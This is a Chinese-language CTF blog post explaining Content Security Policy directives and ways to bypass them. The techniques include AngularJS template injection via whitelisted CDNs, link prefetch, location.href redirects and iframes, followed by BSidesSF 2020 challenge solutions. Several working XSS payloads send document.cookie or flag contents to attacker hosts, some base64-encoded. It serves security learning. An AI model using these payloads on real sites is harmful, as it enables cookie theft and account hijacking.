---
title: '绕过CSP'
date: 2020-03-10
category: 'CTF'
tags:
  - 'CSP'
lang: 'zh'
draft: false
---
## 基本概念

| `default-src` | `'self' cdn.example.com` | 定义资源默认加载策略 |
| --- | --- | --- |
| `script-src` | `'self' js.example.com` | 定义 JS 加载策略 |
| `style-src` | `'self' css.example.com` | 定义 CSS 加载策略 |
| `img-src` | `'self' img.example.com` | 定义图片加载策略 |
| `connect-src` | `'self'` | 定义 Ajax、WebSocket 等加载策略 |
| `font-src` | `font.example.com` | 定义 Font 加载策略 |
| `object-src` | `'self'` | 定义 、、 等引用资源加载策略 |
| `media-src` | `media.example.com` | 定义 |
| `frame-src` | `'self'` | 定义 Frame 加载策略 |
| `sandbox` | `allow-forms allow-scripts` | 对页面的操作应用限制，包括阻止弹出窗口，阻止插件和脚本的执行以及强制执行同源策略。可以不设置sanbox的值使得所有限制启用，或者手动启用以下属性 : `allow-forms` `allow-same-origin` `allow-scripts` `allow-popups`, `allow-modals`, `allow-orientation-lock`, `allow-pointer-lock`, `allow-presentation`, `allow-popups-to-escape-sandbox`, and `allow-top-navigation` |
| `report-uri` | `/some-report-uri` | 指定浏览器报告策略错误的URL，可以在HTTP头中添加`-Report-Only` 来指示浏览器只报告不阻断 |
| `child-src` | `'self'` | child-src指令管理了套嵌浏览的部分（类似于iframe、frame标签） |
| `form-action` | `'self'` | 定义了form表单中action的范围 |
| `frame-ancestors` | `'none'` | 定义`<frame>` `<iframe>` `<object>` `<embed>` `<applet>`加载策略. 直接设置`‘none’` 几乎等于设置了`X-Frame-Options: DENY` |
| `plugin-types` | `application/pdf` | 设置有效的MIME类型 |

## CSP绕过

### 使用CDN绕过

一般来说，前端会用到许多的前端框架和库，可能会引用其他CDN上的JS框架，如果CDN上存在一些低版本的框架，就可能存在绕过CSP的风险

案例中hackmd中CSP引用了cloudflare.com CDN服务，于是orange师傅采用了低版本的angular js模板注入来绕过CSP

```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'unsafe-eval' https://cdnjs.cloudflare.com;">
<!-- foo="-->
<script src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js>
</script>
<div ng-app>
    {{constructor.constructor('alert(document.cookie)')()}}
</div>
```

[修复](https://github.com/hackmdio/codimd/pull/1112/commits/067cfe2d1eedc5a58e5548785858e38fbaa0e84b)

[orange师傅的文章](https://paper.seebug.org/855/)

利用条件:

1.  CDN服务商存在某些低版本的js库
2.  此CDN服务商在CSP白名单中

### location.href

通过页面跳转功能来实现

```
location.href = "vps_ip:xxxx?"+document.cookie
```

### link标签绕过(比较老了)

```
<!-- firefox -->
<link rel="dns-prefetch" href="//${cookie}.vps_ip">

<!-- chrome -->
<link rel="prefetch" href="//vps_ip?${cookie}">
```

带外数据的写法

```js
var link = document.createElement("link");
link.setAttribute("rel", "prefetch");
link.setAttribute("href", "//vps_ip/?" + document.cookie);
document.head.appendChild(link);
```

使用条件：

k可以执行任意的js脚本，但是无法带外数据

### iframe绕过

> 当一个同源站点，同时存在两个页面，其中一个有CSP保护的A页面，另一个没有CSP保护B页面，那么如果B页面存在XSS漏洞，我们可以直接在B页面新建iframe用javascript直接操作A页面的dom，可以说A页面的CSP防护完全失效

### jsonp绕过

[收集](https://github.com/google/csp-evaluator/tree/master/whitelist_bypasses)

## CSP绕过实例

### BSidesSF 2020 csp-1

csp如下，`script-src` 支持 data

```
content-security-policy: 
    script-src 'self' data:; 
    default-src 'self'; 
    connect-src *; 
    report-uri /csp_report
```

可以使用 `fetch` (js实在是不熟悉)

payload-1

```
<script src="data:,fetch('/csp-one-flag').then(x=>x.text()).then(x=>location='http://rwx.kr/?'+escape(x))">
```

或者编码也是可以的

```
// NOTE:
// "ZmV0Y..." is base64 encoded text of this script.
// fetch("https://csp-1-5aa1f221.challenges.bsidessf.net/csp-one-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))

<script src="data:text/javascript;base64,ZmV0Y2goImh0dHBzOi8vY3NwLTEtNWFhMWYyMjEuY2hhbGxlbmdlcy5ic2lkZXNzZi5uZXQvY3NwLW9uZS1mbGFnIikudGhlbihyPT5yLnRleHQoKSkudGhlbih0PT5mZXRjaCgiWU9VUl9TRVJWRVIiK3QpKQ=="></script>
```

### csp-2

```
Content-Security-Policy: 
script-src 'self' ajax.googleapis.com 'unsafe-eval'; 
default-src 'self' 'unsafe-inline'; 
connect-src *; report-uri /csp_report
```

看到了 `ajax.googleapis.com` 在白名单中，可以使用其提供的angularjs的模板注入来绕过

```html
<script src=https://ajax.googleapis.com/ajax/libs/angularjs/1.0.1/angular.min.js></script>
<div ng-app ng-csp>
{{constructor.constructor('eval(atob("ZmV0Y2goIi9jc3AtdHdvLWZsYWciKS50aGVuKHg9PngudGV4dCgpKS50aGVuKHg9PmxvY2F0aW9uPSIvL3J3eC5rci8/Iitlc2NhcGUoeCkp"))')()}}
</div>
```

payload2

```js
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.1.5/angular.min.js"></script> 
<div class="ng-app"> {{ constructor.constructor('fetch("https://csp-2-2446d5a3.challenges.bsidessf.net/csp-two-flag").then(r=>r.text()).then(t=>fetch("YOUR_SERVER"+t))')() }} </div>
```
